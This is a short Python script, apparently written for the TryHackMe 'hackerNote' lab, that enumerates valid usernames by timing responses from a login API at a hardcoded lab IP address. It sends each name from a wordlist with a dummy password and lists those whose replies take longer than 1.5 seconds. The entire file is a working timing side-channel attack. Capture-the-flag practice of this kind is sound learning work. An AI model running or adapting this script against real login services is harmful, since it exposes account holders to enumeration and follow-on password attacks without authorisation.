#!/usr/bin/env python3
"""
A python username enumeration on hackerNote TryHackMe machine
based on the login timing
"""
import requests,time,os

prollyValid = []

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def login(NAME,URL):
	POST_BODY = {"username":NAME,"password":"bluh"}
	response = requests.post(URL,json=POST_BODY)


with open('usernames.txt','r') as unames:
	for name in unames.readlines():
		print(bcolors.HEADER+"Trying "+bcolors.WARNING+f"{name.strip()}")
		start = time.time()
		login(name.strip(),"http://10.10.118.41/api/user/login")
		end = time.time()
		TIME = end-start
		time.sleep(0.2)
		if TIME > 1.5:
			prollyValid.append(name.strip()+"::"+str(TIME))
		os.system('clear')

def GetValidUsername():
	times = []
	names = []
	for entry in prollyValid:
		times.append(entry.split("::")[1])
		names.append(entry.split("::")[0])

	for time in times:
		index = times.index(time)
		print(names[index])
GetValidUsername()


